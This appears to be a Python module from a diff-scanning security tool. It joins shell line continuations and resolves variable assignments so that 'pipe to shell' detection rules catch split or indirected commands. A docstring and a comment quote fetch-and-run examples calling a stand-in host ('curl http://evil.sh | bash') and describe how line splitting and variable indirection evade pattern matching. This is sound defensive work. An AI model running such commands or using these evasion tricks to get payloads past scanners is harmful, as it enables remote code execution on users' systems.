import re


def join_line_continuations(lines: list[str]) -> list[str]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    buf: str | None = None
    marker = ""
    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if buf is not None and this_marker == marker:
            buf = f"{buf} {body.strip()}"
        else:
            if buf is not None:
                out.append(marker + buf)
            buf, marker = body, this_marker
        if buf.rstrip().endswith("\\"):
            buf = buf.rstrip()[:-1].rstrip()
        else:
            out.append(marker + buf)
            buf, marker = None, ""
    if buf is not None:
        out.append(marker + buf)
    return out


# Assignments are frequently indented (every one inside a function body
# is) and may be introduced by a declaration keyword.  Anchoring on the
# bare name meant the variable table stayed empty for function bodies,
# so `C=curl; $C evil | bash` never resolved and defeated every rule
# that matches resolved strings.
_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*=\s*(.+)"
)


def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    additions = []
    for line in join_line_continuations(diff_text.splitlines()):
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)

    var_table: dict[str, str] = {}
    resolved: list[str] = []
    unresolved_candidates: list[str] = []

    for line in additions:
        m = _ASSIGNMENT_RE.match(line)
        if m:
            name = m.group(1)
            value = m.group(2).strip()

            if (value.startswith('"') and value.endswith('"')) or (
                value.startswith("'") and value.endswith("'")
            ):
                value = value[1:-1]

            if "$(" not in value and "`" not in value:
                var_table[name] = value
            else:
                unresolved_candidates.append(line)
        else:
            unresolved_candidates.append(line)

    for _ in range(10):
        changed = False
        new_table = {}
        for k, v in var_table.items():

            def replacer(m: re.Match) -> str:
                var = m.group(1) or m.group(2)
                return var_table.get(var, m.group(0))

            new_val = re.sub(r"\$\{(\w+)\}|\$(\w+)", replacer, v)
            if new_val != v:
                changed = True
            new_table[k] = new_val
        var_table = new_table
        if not changed:
            break

    for line in unresolved_candidates:

        def replacer(m: re.Match) -> str:
            var = m.group(1) or m.group(2)
            return var_table.get(var, m.group(0))

        resolved_line = re.sub(r"\$\{(\w+)\}|\$(\w+)", replacer, line)
        resolved.append(resolved_line)

    return resolved, [u for u in unresolved_candidates if u not in resolved]